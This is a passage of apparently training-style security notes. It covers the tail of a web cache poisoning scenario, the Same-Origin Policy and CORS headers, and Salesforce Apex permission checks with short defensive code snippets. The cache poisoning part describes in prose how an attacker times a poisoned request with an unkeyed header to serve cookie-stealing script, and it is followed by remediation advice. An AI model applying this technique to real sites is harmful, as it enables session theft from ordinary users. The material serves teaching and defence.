The only thing he needs to do next is to put the name of his malicious server into the X-Script-Source header of the intercepted request.

### VULNERABILITY EXPLOITED
To poison cache with his malicious request, Bob needs to make sure that he sends it to the application right after the current cached response expires. To define the correct time, he uses the values of the Age header and max-age directive of the Cache-Control header of the server response.

### MALICIOUS RESULT
Now each user that will request the LotsOfGoods.me homepage in the next 2400 seconds will receive Bob's malicious response from the cache server. The script will be executed in their browsers, and their cookies will be stolen.

### REMEDIATION
Manipulating unkeyed HTTP request component, an attacker can do a lot of harm if these components influence the page content. To prevent cache poisoning, you should do the following:

1. Cache only static data.

2. If you are using some third-party service for caching, check which security controls against cache poisoning it provides.

3. Do not trust any data from header directives of the HTTP requests. Always consider it tainted by default.

4. When you cache a page, make sure that all the headers of the HTTP request that influence the page content - are keyed. And vice versa, if some header is unkeyed, don't use it in any business logic that implies influencing the page content.

5. Check if your caching mechanism or framework is configurable to prevent cache poisoning.

### SAME-ORIGIN POLICY INTRODUCED
ame-Origin Policy (SOP) is a major security concept that is built-in in all contemporary browsers. Its main goal is to prevent access attempts of dynamic web page elements (like scripts) to data on resources of a different origin.

In the security context, SOP prevents malicious web sites from retrieving confidential data from restricted locations on behalf of users and without their acknowledgment.

User agents that are compliant with SOP, restrict requests issued from one origin to another origin. For example, popular JS libraries such as JQuery, XmlHttpRequests and Fetch API follow the Same-Origin Policy.

In the right pane, you can see the animated diagram of how SOP works when enabled in the browser.

### ORIGIN DEFINED
To identify an origin, SOP uses the scheme, the hostname (domain name with or without subdomains, or IP address), and the port number. If those three parameters of two resources match, then these resources have the same origin.

### SAME-ORIGIN POLICY DISABLED
Let us consider an example where there is no Same-Origin Policy at all.

Bob creates a website coolnews.me with funny cat pictures and adds there a basic javascript that makes a request to the website of a popular social network friendslist.me, reads the contents of a page with personal details exactly as the authenticated victim would, both body and headers, and sends them to Bob's server.

If he shares a link to his website on his social network page, then everyone who follows that link will involuntarily share their personal details with Bob.

### SAME-ORIGIN POLICY ENABLED
With Same-Origin Policy enabled, the browser allows only some basic HTTP requests (e.g. GET and POST requests without any custom HTTP headers) from the resource of one origin to the resource of another origin, and will never allow a script from the Coolnews.me to read the response from the Friendslist.me (unless CORS is also enabled).

In the case with Bob's malicious page, the browser will first send a preflight request to the Friendslist.me website to ensure that the request is allowed, and, since Friendslist.me knows nothing about Coolnews.me and doesn't trust it, it disallows the access. The browser will then prevent the malicious request from ever being sent.

### CROSS-ORIGIN RESOURCE SHARING INTRODUCED
Cross-Origin Resource Sharing (CORS) is a way to deliberately disable SOP. We may need it for implementation of some business logic that requires sending requests to another origin, like performing interactions with cloud services, creating a single-page design, using sharing or liking functionality, etc.

The main idea of CORS is to negotiate with the server on the conditions of the cross-origin request. As a result, either a resource from one origin will be allowed to send an HTTP request to the resource from another origin and read the contents of the response, or the request will be aborted due to the disabled cross-origin resource sharing.

In the right pane, you can see that the cross-origin request to the server that provides stock market quotes for the news website was aborted.

### PREFLIGHT REQUEST CONDITIONS
For the requests that do not meet the requirements below, negotiation on the conditions of the cross-origin request is performed using a preflight request. Preflight requests are triggered when the following conditions are NOT met.

1. An initial cross-origin request uses GET, HEAD or POST methods. For POST method, only application/x-www-form-urlencoded, multipart/form-data, or text/plain content types are allowed.

2. The cross-origin request doesn't contain custom HTTP headers and includes only the headers explicitly allowed by the CORS policy.

3. No event listeners are registered on an XMLHttpRequestUpload object that is used in the cross-origin request.

4. No ReadableStream objects are used in the cross-origin request.

In other words, a cross-origin request that meets the conditions above doesn't trigger the preflight request.

Instead of the preflight request, negotiation on the conditions is performed using the Origin header in the request, and the Access-Control-Allow-Origin header in the response. If the Access-Control-Allow-Origin header contains the specified origin or an asterisk, the content of the response becomes accessible to the code that performed the request.

### PREFLIGHT REQUEST
When the preflight request is triggered, the initial request is postponed until the server confirms the properties of the request to be sent. The preflight request is an HTTP OPTIONS request that contains Origin header and may include CORS-specific headers.

### CROSS-ORIGIN COMMUNICATION HEADERS
CORS mechanism uses several HTTP headers to agree on cross-origin communication parameters.

Origin

This header indicates the origin that initiates a request

Access-Control-Request-Method

This header indicates the HTTP request methods that will be used in the further cross-origin request

Access-Control-Request-Headers

The header indicates the headers that will be used in the further cross-origin request

Access-Control-Allow-Origin

The header specifies the origin that may access the requested resource. If the header value is * then any origin may access the resource.

Access-Control-Max-Age

The header specifies how long information from Access-Control-Allow-Methods and Access-Control-Allow-Headers should be cached.

Access-Control-Allow-Methods

The header specifies the method or methods that may be used in the original cross-origin requests to the resource.

Access-Control-Expose-Headers

The header specifies the list of headers that browsers are allowed to access in the original cross-origin header when a requester processes the response.

Access-Control-Allow-Credentials

The header indicates that the server will accept the original request if it contains credentials. In this case, credentials may be one of the following: HTTP cookies, TLS certificates, and HTTP authentication headers.

In order to use credentials, the requesting origin should declare that their usage explicitly e.g. set XHRObject.withCredentials = true or set a fetch request credentials mode to "include".

The header usually contains "true" value or is not present.

Access-Control-Allow-Headers

The header specifies the headers that may be used in the original cross-origin requests to the resource. Simple response headers are available by default, but custom headers will require whitelisting.

## Apex Security and Sharing
Apex runs in system context - the current user's permissions, field-level security, and sharing rules are not taken into account during code execution.
Web services can be restricted by permissions, but execute in system context once they are initiated.

Enforcing sharing rules by using the with sharing keyword doesn’t enforce the user's permissions and field-level security. Apex code always has access to all fields and objects in an organization, ensuring that code won’t fail to run because of hidden fields or objects for a user.

Enforcing the current user's sharing rules can impact:
• SOQL and SOSL queries. A query may return fewer rows than it would operating in system context.
• DML operations. An operation may fail because the current user doesn't have the correct permissions. For example, if the user specifies a foreign key value that exists in the organization, but which the current user does not have access to.

Apex doesn't enforce object-level and field-level permissions by default, you can enforce these permissions in your SOQL queries by using `WITH SECURITY_ENFORCED`.

Enforce object-level and field-level permissions in your code by explicitly calling the sObject describe result methods (of `Schema.DescribeSObjectResult`) and the field describe result methods (of `Schema.DescribeFieldResult`) that check the current user's access permission levels. In this way, you can verify if the current user has the necessary permissions, and only if he or she has sufficient permissions, you can then perform a specific DML operation or a query.

For example, you can call the `isAccessible`, `isCreateable`, or `isUpdateable` methods of `Schema.DescribeSObjectResult` to verify whether the current user has read, create, or update access to an sObject, respectively.

`Schema.DescribeFieldResult` exposes access control methods to call to check the current user's read, create, or update access for a field.  In addition, you can call `isDleteable` method provided by `Schema.DescribeSObjectResult` to check if the current user has permission to delete a specific sObject.

### Calling Access Control Methods
To check the field-level update permission of the contact's email field before updating it:
```java
if (Schema.SObjectType.Contact.fields.Email.isUpdateable()) {
    // Update email address
}
```

To check the field level create permission of the contact's email address field before creating a new contact:
```java
if (Schema.SObjectType.Contact.fields.Email.isCreateable()) {
    // Create new contact
}
```

To check the field-level read permission of the contact's email field before querying for this field:
```java
if (Schema.SObjectType.Contact.fields.Email.isAccessible()) {
    Contact c = [SELECT Email FROM Contact WHERE Id =:Id];
}
```

To check the object-level permission for the contact before deleting the contact
```java
if (Schema.SObjectType.Contact.isDeletable()) {
    // Delete contact
}
```

If you call the `SObject describe result` and `field describe result` access control methods, the verification of object and field-level permissions is performed in addition to the sharing rules that are in effect.
* Sometimes, the access level granted by a sharing rule could conflict with an object-level or field-level permission.

## Apex Class Security
Specify which users can execute methods in a top-level class based on their user profile or permission sets.  You can only set security on Apex classes and not on permission sets.

## Apex Managed Sharing
Sharing is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.

Sharing enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant additional access programmatically with Apex.
